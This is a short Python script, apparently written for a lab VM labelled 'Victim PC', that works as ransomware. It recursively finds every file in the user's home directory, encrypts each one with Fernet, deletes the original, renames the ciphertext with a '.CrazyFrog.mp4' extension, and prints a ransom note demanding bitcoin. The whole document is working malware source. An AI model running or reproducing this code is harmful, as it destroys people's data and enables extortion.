#####VM part, Victim PC#####

##cryptography package has our fernet symetric enc, AES in CBC mode with a 128-bit key for encryption; using PKCS7 padding.HMAC using SHA256 for authentication.
import signal
from cryptography.fernet import Fernet 
import os
import glob ##finds all the pathnames matching a specified pattern



homeDir = os.path.expanduser('~') #grabs user home directory
fern_key = Fernet.generate_key()

key = open("secret.key", "wb")# as Enc_key:   #was secret.key
key.write(fern_key)
key.close()
#print(f'value of my secret key is: {fern_key}')


##maybe for loop with list of excluded file types, (.key and .py)

files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #grabs files we want to enc   #swithc \\ to / for linux   f'{homeDir}/**/*.*', recursive=True)    *.[!key]*
#files = glob.glob(f'{homeDir}/**/*.[!py]*', recursive=True) #grabs files we want to enc   #swithc \\ to / for linux   f'{homeDir}/**/*.*', recursive=True)    *.[!key]*

#############################################just added have to test
file_list=[]
for filename in files:
    if ".key" not in filename and ".py" not in filename:
        #print(f'im looking at: {filename}')
        file_list.append(filename)




fernet = Fernet(fern_key) #was key



for file in file_list:  ##was files
    fileName = str(file)    ##added
    extension = os.path.splitext(file)[1]  ###gets all extensions
    
    
    with open(file, 'rb') as f:
        f_bytes=f.read()
    
    f_bytes_encrypted = fernet.encrypt(f_bytes)
    print(f'Your file {file} has been encrypted')
    os.remove(file) #added
    
    fileExtension = '.CrazyFrog.mp4'
    encFile = fileName + fileExtension  ##works
    
    with open(encFile, 'wb') as f:      ###changed file to encFile
        f.write(f_bytes_encrypted)

ransomNote="""
Attention, your Personal Files have been Encrypted with a Government Grade Encryption System.
Please upload a Maximum of 5 files per 1btc along with the [/app/secret.key] file 
to our website www.uploaderwebsite.com along with your recepit.
Thank you for your understanding.
"""
print(ransomNote)
